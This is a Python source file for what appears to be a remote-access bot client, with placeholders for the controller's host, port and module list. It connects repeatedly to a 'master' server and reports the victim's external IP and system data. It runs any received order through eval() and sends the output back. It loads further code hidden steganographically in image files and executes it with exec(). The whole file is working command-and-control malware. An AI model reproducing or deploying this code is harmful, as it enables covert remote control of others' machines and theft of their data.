from cProfile import run
from doctest import master
import json
import socket
import warnings
import time
from threading import Thread

from core.module_handler import *
from util.system_utils import get_external_ip, get_system_data

with warnings.catch_warnings():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import imp

results = []

def import_code(code, name):
    module = imp.new_module(name)
    exec (code, module.__dict__)
    
    return module

def load_modules(modules_list):
    for module_name in modules_list:
        img_path = get_image_path(module_name)
        if img_path:
            module_code = extract_lsb_data_from_image(img_path)
            module = import_code(module_code, module_name)
            globals()[module_name] = module

def run_command(command):
    r = eval(command)
    return r

def process_order(order):
    result = run_command(order)

    if result:
        results.append(str(result))

def send_heartbeat(s):

    hearbeat_data = {
        "location": get_external_ip(),
        "system": get_system_data()
    }
    try:
        s.send(bytes(json.dumps(hearbeat_data), encoding='utf-8'))
        return True
    except:
        return False


def listen_master(host, port):

    s = socket.socket()

    try:
        s.connect((host, port))
    except:
        return 

    modules_list = ['{MODULES}']
    load_modules(modules_list)

    while send_heartbeat(s):
        try:
            s.settimeout(5)
            order = s.recv(10000)
            if order:
                t = Thread(target=process_order, args=(order.decode(),))
                t.start()
        except:
            pass
        finally:
            s.settimeout(None)

        if len(results) > 0:
            result = results.pop()
            if result:
                s.send(bytes(str(result), encoding='utf-8'))

if __name__ == '__main__':
    while True:
        host = '{HOST}'
        port = int('{PORT}')

        listen_master(host, port)
        time.sleep(10)